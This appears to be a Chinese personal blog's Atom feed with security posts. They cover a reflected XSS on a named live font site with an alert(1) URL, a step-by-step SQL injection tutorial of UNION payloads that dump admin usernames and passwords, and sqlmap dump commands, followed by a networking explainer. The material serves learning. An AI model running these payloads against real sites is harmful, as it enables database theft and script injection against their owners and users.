<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kayleh</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://kayleh.top/"/>
  <updated>2021-04-10T18:34:50.086Z</updated>
  <id>https://kayleh.top/</id>
  
  <author>
    <name>Kayleh</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Reflected XSS Vulnerability in Font Download Website</title>
    <link href="https://kayleh.top/Reflected-XSS-Vulnerability-inFont-Download-Website/"/>
    <id>https://kayleh.top/Reflected-XSS-Vulnerability-inFont-Download-Website/</id>
    <published>2021-04-10T18:26:29.000Z</published>
    <updated>2021-04-10T18:34:50.086Z</updated>
    
    <content type="html"><![CDATA[<h2 id="字体下载网站的反射XSS漏洞"><a href="#字体下载网站的反射XSS漏洞" class="headerlink" title="字体下载网站的反射XSS漏洞"></a>字体下载网站的反射XSS漏洞</h2><blockquote><p>URL:<a href="http://www.ztxz.org" target="_blank" rel="noopener">http://www.ztxz.org</a></p></blockquote><p>搜索框输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>会出现弹窗，证明反射XSS的存在。</p><blockquote><p><a href="http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E" target="_blank" rel="noopener">http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E</a></p></blockquote><p>用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。例如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作。它的利用过程如图所示。</p><p> <img src="/Reflected-XSS-Vulnerability-inFont-Download-Website/Blog\source\_posts\Reflected-XSS-Vulnerability-in-Font-Download-Website\20190522105651307.png" alt="在这里插入图片描述"> </p><p>反射型XSS不会永久存储用户的数据，仅发生在用户的一次访问过程之后。这个过程就像一次反射，因此得名反射型XSS。反射型XSS的触发条件比较苛刻，需要攻击者想方设法引导用户点击链接，但产生的危害不容忽视。</p><p>参考资料：<a href="https://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html" target="_blank" rel="noopener">https://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html</a></p><p> <a href="http://blog.csdn.net/binyao02123202/article/details/9041113" target="_blank" rel="noopener">http://blog.csdn.net/binyao02123202/article/details/9041113</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;字体下载网站的反射XSS漏洞&quot;&gt;&lt;a href=&quot;#字体下载网站的反射XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;字体下载网站的反射XSS漏洞&quot;&gt;&lt;/a&gt;字体下载网站的反射XSS漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;URL:&lt;a hr
      
    
    </summary>
    
    
    
      <category term="safety" scheme="https://kayleh.top/tags/safety/"/>
    
  </entry>
  
  <entry>
    <title>SQL injection</title>
    <link href="https://kayleh.top/SQL-injection-vulnerability/"/>
    <id>https://kayleh.top/SQL-injection-vulnerability/</id>
    <published>2021-04-06T01:48:59.000Z</published>
    <updated>2021-04-08T18:24:04.730Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><blockquote><p><a href="https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html" target="_blank" rel="noopener">https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html</a></p></blockquote><h2 id="常见的几种SQL注入"><a href="#常见的几种SQL注入" class="headerlink" title="常见的几种SQL注入"></a>常见的几种SQL注入</h2><blockquote><p>1.数字型<br>2.字符型<br>3.文本型<br>4.搜索型(POST/GET)<br>5.cookie注入<br>6.SQL盲注<br>7.编码注入<br>8.宽字节注入</p></blockquote><h2 id="MySQL报错注入基本流程"><a href="#MySQL报错注入基本流程" class="headerlink" title="MySQL报错注入基本流程"></a>MySQL报错注入基本流程</h2><blockquote><p>1.判断sql注入<br>2.数据库权限判断<br>3.判断字段数<br>4.查询库名<br>5.查表名<br>6.查字段<br>7.查数据</p></blockquote><h3 id="1-数字型"><a href="#1-数字型" class="headerlink" title="1.数字型"></a>1.数字型</h3><p>1.判断sql注入</p><ul><li><p>提交单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2'</span><br></pre></td></tr></table></figure></li><li><p>and大法和or大法</p><p>在参数后面加上<code>and 1 = 1</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2 and 1 = 1     //可以查询</span><br><span class="line">http://localhost/sqls/index.php?id=2 and 1 = 2   //查询错误</span><br></pre></td></tr></table></figure><p> 可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。</p><p> 接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。 </p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=5 or 1 = 1</span><br></pre></td></tr></table></figure></li><li><p>加法和减法</p><p>加法和减法的使用要区别是数字型还是字符型的注入、然后来区分了、可以看他后面的参数如果是数字、就一定是数字型、如果是一些字母的话就是字符型注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id&#x3D;4  &#x2F;&#x2F;数字型注入 sql 语句</span><br><span class="line">select * from user where username&#x3D;’fendo’ &#x2F;&#x2F;字符型注入 sql 语句</span><br></pre></td></tr></table></figure><ul><li><p>加法</p><p> 我们在参数输入1+1，看看返回的数据是不是id等于2的结果，这里注意一下+号在SQL语句是有特效含义的，所以我们要对其进行url编码，最后也就是%2b。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>+<span class="number">1</span> //第二条数据</span><br></pre></td></tr></table></figure></li><li><p>减法</p><p>减法是同样的道理，不过不需要对-号进行url编码了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">2</span><span class="number">-1</span> //第一条数据</span><br></pre></td></tr></table></figure></li></ul></li><li><p>数据库权限判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(user(),1,1))=114</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">判断ROOT权限 返回正确存在 </span><br><span class="line"><span class="comment">----------------------------------</span></span><br><span class="line">或 and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span></span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span>   <span class="comment">/* 如果结果返回正常,说明具有读写权限。</span></span><br><span class="line"><span class="comment">and (select count(*) from mysql.user)&gt;0   /* 返回错误，应该是管理员给数据库帐户降权了。</span></span><br></pre></td></tr></table></figure></li><li><p>判断字段数</p><p>常用的两种猜解方式:</p><ul><li><p>用union联合查询：and 1=1 union select 1,2,3,4,5…… 或 union select null,null,null…..</p><p>UNION SELECT 联合查询：可以用于一个或多个SELECT的结果集，但是他有一个条件，就是两个select查询语句的查询必须要有相同的列才可以执行，利用这个特性我们可以进行对比查询，也就是说当我们union select的列与它查询的列相同时，页面返回正常。在and后面加上1=1或1=2的作用后面会讲。</p></li></ul><p>例：</p><p>当字段为2时页面返回错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2 and 1 = 1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> //错误</span><br><span class="line"><span class="keyword">http</span>://localhost/sqls/index.php?<span class="keyword">id</span>=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> //正常查询</span><br><span class="line"><span class="keyword">http</span>://localhost/sqls/index.php?<span class="keyword">id</span>=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> //错误</span><br><span class="line"><span class="comment">-----</span></span><br><span class="line">说明字段数就是<span class="number">3</span>，输入的数大于或小于字段数时都会报错。使用 <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span> 是一样的</span><br><span class="line"><span class="keyword">http</span>://localhost/sqls/index.php?<span class="keyword">id</span>=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br></pre></td></tr></table></figure><ul><li><p>2.用order by 查询“order by * — order by</p><p>order by查询：在sql语句中是对结果集的指定列进行排序，比如我们想让结果集按照第一列排序就是 order by 1 按照第二列排序 order by 2 依次类推，按照这个原理我们来判断他的字段数，如果我们按照他的第1列进行排序数据库会返回正常，但是当我们按照第100列排序，但是数据库中并不存在第100列，从而报错。  同union</p></li></ul></li></ul><p><strong>这里有两个问题</strong></p><p><strong>第一个</strong>：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。<br>第一种：我们让第一个查询的结果始终为假</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2  and 1=2 union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br></pre></td></tr></table></figure><p><strong>第二种</strong>：通过limit语句，limit在mysql中是用来分页的，通过他可以从查询出来的数据中获取我们想要的数据</p><p>limit语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT [offset] rows | rows OFFSET offset</span><br></pre></td></tr></table></figure><p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，初始记录行的偏移量是 0(而不是 1)。</p><p>列:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table LIMIT 5,10; &#x2F;&#x2F; 检索记录行 6-15</span><br></pre></td></tr></table></figure><p>在地址后面加入以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2  union select null,null,null limit 1,1</span><br></pre></td></tr></table></figure><p>  第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。 </p><p> <img src="/SQL-injection-vulnerability/Blog\source\_posts\SQL注入漏洞\584a947239ae725aab3ee529f701eb7d.jpg" alt="img"> </p><ul><li>查询库名</li></ul><p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。</p><p>通过下面的语句可以判断数据库版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(version(),1,1))&gt;51</span><br></pre></td></tr></table></figure><p>解释1： 确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，当版本大于3.0时才能使用union方法；<br>解释2：ord()是mysql的函数用于获取二进制码；<br>解释3：mid()是mysql的函数用于截位操作；<br>解释4：version()是mysql的函数用于获取当前数据库的版本；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2  and ord(mid(version(),1,1))&gt;51</span><br></pre></td></tr></table></figure><p><strong>方法一:</strong></p><p>可以直接使用mysql自带函数database()查询得到数据库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select 1,database(),3 limit 1,1</span><br></pre></td></tr></table></figure><p><strong>方法二:</strong></p><p>使用以下语句语句得到所有的数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,schema_name,null from information_schema.schemata</span><br></pre></td></tr></table></figure><p>还可以获取第一个库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,1</span><br></pre></td></tr></table></figure><p> <img src="/SQL-injection-vulnerability/Blog\source\_posts\SQL注入漏洞\86d1024ab776770ef0a2f6e559ec83df.jpg" alt="img"> </p><p>并没有显示数据库名而显示的是第一条语句查询出来的结果。在union前面加上and 1=2，就能显示出来了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,1</span><br></pre></td></tr></table></figure><p>获取第二个库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,2</span><br></pre></td></tr></table></figure><ul><li>查表名</li></ul><p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表。</p><p>方法一:</p><p>用group_concat它可以返回查询的所有结果，因为我们需要通过命名判断该我们需要的敏感数据。</p><p>group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;test&#39;</span><br></pre></td></tr></table></figure><p>方法二:</p><p>使用下面的语句也是可以查出来的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2 union <span class="keyword">select</span> <span class="literal">null</span>,table_name,<span class="literal">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'test'</span></span><br></pre></td></tr></table></figure><ul><li><p>查字段</p><p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。 </p><p>方法一:</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;sqltest&#39;</span><br></pre></td></tr></table></figure><p>  <img src="/SQL-injection-vulnerability/Blog\source\_posts\SQL注入漏洞\055b34fa808266a8e9af8b9cea0865db.jpg" alt="img"> </p><p>也可以查看admin表中的字段。 </p><p>方法二:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2  union select null,column_name,null from information_schema.columns where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure><ul><li><p>查数据</p><p>最终想得到的就是字段里的内容了、前面的数据库名、表名都获得了、获取值就很简单了。</p><p>方法一:</p><p>查询sqltest表:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqls/index.php?id=2  union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">id</span>,title,<span class="keyword">content</span>),<span class="number">3</span> <span class="keyword">from</span> <span class="string">`sqltest`</span></span><br></pre></td></tr></table></figure><p>查询admin表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(id,user,pwd),3 from admin</span><br></pre></td></tr></table></figure><p>方法二:</p><p>查询sqltest表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,title,content from sqltest</span><br></pre></td></tr></table></figure><p>查询admin表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select id,user,pwd from admin</span><br></pre></td></tr></table></figure><p>方法三:</p><p>查询admin表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,2,concat(user,0x3c,pwd) from admin</span><br></pre></td></tr></table></figure></li></ul><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><blockquote><p>工具：sqlmap</p><p>靶场：<a href="https://rimovni.exeye.run/hugkudure/well" target="_blank" rel="noopener">https://rimovni.exeye.run/hugkudure/well</a></p><p><img src="/SQL-injection-vulnerability/Blog\source\_posts\SQL注入漏洞\1617673856077.png" alt="1617673856077" style="zoom:50%;"></p></blockquote><p>sqlmap注入常见用法：</p><div class="table-container"><table><thead><tr><th>检查注入点</th><th>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“</th></tr></thead><tbody><tr><td>列数据库信息</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ —dbs</td></tr><tr><td>指定数据库名列出所有表</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname —tables</td></tr><tr><td>指定数据库名表名列出所有字段</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname -T tablename —columns</td></tr><tr><td>定数据库名表名字段dump出指定字段</td><td>sqlmap -u “<a href="http://ooxx.com/a.php?id=1" target="_blank" rel="noopener">http://ooxx.com/a.php?id=1</a>“ -D dbsname -T tablename -C columnname —dump</td></tr><tr><td>cookie 注入</td><td>—cookie=COOKIE 在需要登录的地方，需要登录后的cookie</td></tr><tr><td>执行指定的 SQL 语句</td><td>—sql-query=QUERY</td></tr><tr><td>代理注入</td><td>—proxy=”<a href="http://127.0.0.1:8087" target="_blank" rel="noopener">http://127.0.0.1:8087</a>“</td></tr></tbody></table></div><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "https://rimovni.exeye.run/hugkudure/well" --form --batch -D twosecu1_vuln_06 -T flag -C flag --dump</span><br></pre></td></tr></table></figure><blockquote><p>—form   :表单</p><p>—batch  :跳过选择</p></blockquote><p>开始注入，获得数据库</p><p><img src="/SQL-injection-vulnerability/Blog\source\_posts\SQL注入漏洞\1617674097343.png" alt="1617674097343"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bugbank.cn/q/article/598
      
    
    </summary>
    
    
    
      <category term="security" scheme="https://kayleh.top/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Front end security</title>
    <link href="https://kayleh.top/Front-end-security/"/>
    <id>https://kayleh.top/Front-end-security/</id>
    <published>2021-04-04T15:56:49.000Z</published>
    <updated>2021-04-06T01:48:51.717Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前端安全</p></blockquote><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>跨站脚本攻击，是WEB程序中一种常见的漏洞。其主要的攻击手段是在在利用网站上的可由用户输入信息的地方，恶意注入含有攻击性的脚本，达到攻击网站或者窃取用户cookied等隐私信息的目的。</p><blockquote><p>XSS漏洞测设流程：<br>第一步：在目标站点上找到输入点，比如查询接口，留言板等；<br>第二步：输入一组“特殊字符+唯一识别字符”，点击提交，查看返回的源码，是否有做对应的处理；<br>第三步：通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构成执行js的条件（构造闭合）<br>第四步：提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执则说明存在XSS漏洞</p></blockquote><h1 id="Html5存储"><a href="#Html5存储" class="headerlink" title="Html5存储"></a>Html5存储</h1><p><img src="https://static.cdnjs.cloud/20200628/%E6%89%B9%E6%B3%A8%202020-06-28%20113456_2412.png" alt="img"> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前端安全&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;xss&quot;&gt;&lt;a href=&quot;#xss&quot; class=&quot;headerlink&quot; title=&quot;xss&quot;&gt;&lt;/a&gt;xss&lt;/h1&gt;&lt;p&gt;跨站脚本攻击，是WEB程序中一种常见的漏洞。其主要的攻
      
    
    </summary>
    
    
    
      <category term="security" scheme="https://kayleh.top/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>What happened from entering the URL to displaying the page?</title>
    <link href="https://kayleh.top/What-happened-from-entering-the-URL-to-displaying-the-page/"/>
    <id>https://kayleh.top/What-happened-from-entering-the-URL-to-displaying-the-page/</id>
    <published>2021-03-30T17:22:51.000Z</published>
    <updated>2021-04-09T17:10:26.885Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从输入URL到显示页面经历了什么"><a href="#从输入URL到显示页面经历了什么" class="headerlink" title="从输入URL到显示页面经历了什么?"></a>从输入URL到显示页面经历了什么?</h1><blockquote><ul><li><p>这个过程可以大致分为两个部分：网络通信和页面渲染。</p><h3 id="一、网络通信"><a href="#一、网络通信" class="headerlink" title="一、网络通信"></a>一、网络通信</h3><p>  互联网内各网络设备间的通信都遵循TCP/IP协议，利用TCP/IP协议族进行网络通信时，会通过分层顺序与对方进行通信。分层由高到低分别为：应用层、传输层、网络层、数据链路层。发送端从应用层往下走，接收端从数据链路层网上走。如图所示：</p><p><a href="http://images0.cnblogs.com/blog/622045/201507/020946547655321.png" target="_blank" rel="noopener"><img src="/What-happened-from-entering-the-URL-to-displaying-the-page/Blog\source\_posts\从输入URL到显示页面经历了什么\020946553127518.png" alt="TCPIP"></a></p><h4 id="1-在浏览器中输入url"><a href="#1-在浏览器中输入url" class="headerlink" title="1. 在浏览器中输入url"></a>1. 在浏览器中输入url</h4><p>  用户输入url，例如<a href="http://[www.baidu.com](http://www.baidu.com/)。其中http为协议，[www.baidu.com](http://www.baidu.com/)为网络地址，及指出需要的资源在那台计算机上。一般网络地址可以为域名或IP地址，此处为域名。使用域名是为了方便记忆，但是为了让计算机理解这个地址还需要把它解析为IP地址。">http://[www.baidu.com](http://www.baidu.com/)。其中http为协议，[www.baidu.com](http://www.baidu.com/)为网络地址，及指出需要的资源在那台计算机上。一般网络地址可以为域名或IP地址，此处为域名。使用域名是为了方便记忆，但是为了让计算机理解这个地址还需要把它解析为IP地址。</a></p><h4 id="2-应用层DNS解析域名"><a href="#2-应用层DNS解析域名" class="headerlink" title="2.应用层DNS解析域名"></a>2.应用层DNS解析域名</h4><p>  客户端先检查本地是否有对应的IP地址，若找到则返回响应的IP地址。若没找到则请求上级DNS服务器，直至找到或到根节点。</p></li></ul><ul><li>DNS中递归查询和迭代查询的区别</li></ul><p>  1、 递归查询： 一般客户机和服务器之间属递归查询，即当客户机向DNS服务器发出请求后，若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到结果后转交客户机。</p><p>  2、 迭代查询（反复查询）： 一般DNS服务器之间属迭代查询，如：若DNS2不能响应DNS1的请求，则它会将DNS3的IP给DNS2，以便其再向DNS3发出请求。</p><p>  以一个DNS请求解析为例：</p><p>  1）用户发起域名请求到dnsA，这时dnsA有这个记录，将结果返回给用户，这个过程是递归查询。</p><p>  2）用户发起域名请求到dnsA，这时dns没有这个记录，它去向dnsB问有没有这个记录，以此类推，直到把结果返回给用户，这个过程是递归查询。</p><p>  3）用户发起域名请求到dnsA，这时dnsA没有这个记录，它告诉用户，我没有这个记录，你去问dnsB吧，这个过程是迭代查询。</p><h4 id="3-应用层客户端发送HTTP请求"><a href="#3-应用层客户端发送HTTP请求" class="headerlink" title="3.应用层客户端发送HTTP请求"></a>3.应用层客户端发送HTTP请求</h4><p>  HTTP请求包括请求报头和请求主体两个部分，其中请求报头包含了至关重要的信息，包括请求的方法（GET / POST）、目标url、遵循的协议（http / https / ftp…），返回的信息是否需要缓存，以及客户端是否发送cookie等。</p><h4 id="4-传输层TCP传输报文"><a href="#4-传输层TCP传输报文" class="headerlink" title="4.传输层TCP传输报文"></a>4.传输层TCP传输报文</h4><pre><code>位于传输层的TCP协议为传输报文提供可靠的字节流服务。它为了方便传输，将大块的数据分割成以报文段为单位的数据包进行管理，并为它们编号，方便服务器接收时能准确地还原报文信息。TCP协议通过“三次握手”等方法保证传输的安全可靠。</code></pre><p>   “三次握手”的过程是，发送端先发送一个带有SYN（synchronize）标志的数据包给接收端，在一定的延迟时间内等待接收的回复。接收端收到数据包后，传回一个带有SYN/ACK标志的数据包以示传达确认信息。接收方收到后再发送一个带有ACK标志的数据包给接收端以示握手成功。在这个过程中，如果发送端在规定延迟时间内没有收到回复则默认接收方没有收到请求，而再次发送，直到收到回复为止。</p><p>  <a href="http://images0.cnblogs.com/blog/622045/201507/020946557039933.png" target="_blank" rel="noopener"><img src="/What-happened-from-entering-the-URL-to-displaying-the-page/Blog\source\_posts\从输入URL到显示页面经历了什么\020946560314133.png" alt="TCP"></a> </p><h4 id="5-网络层IP协议查询MAC地址"><a href="#5-网络层IP协议查询MAC地址" class="headerlink" title="5.网络层IP协议查询MAC地址"></a>5.网络层IP协议查询MAC地址</h4><pre><code>IP协议的作用是把TCP分割好的各种数据包传送给接收方。而要保证确实能传到接收方还需要接收方的MAC地址，也就是物理地址。IP地址和MAC地址是一一对应的关系，一个网络设备的IP地址可以更换，但是MAC地址一般是固定不变的。ARP协议可以将IP地址解析成对应的MAC地址。当通信的双方不在同一个局域网时，需要多次中转才能到达最终的目标，在中转的过程中需要通过下一个中转站的MAC地址来搜索下一个中转目标。</code></pre><h4 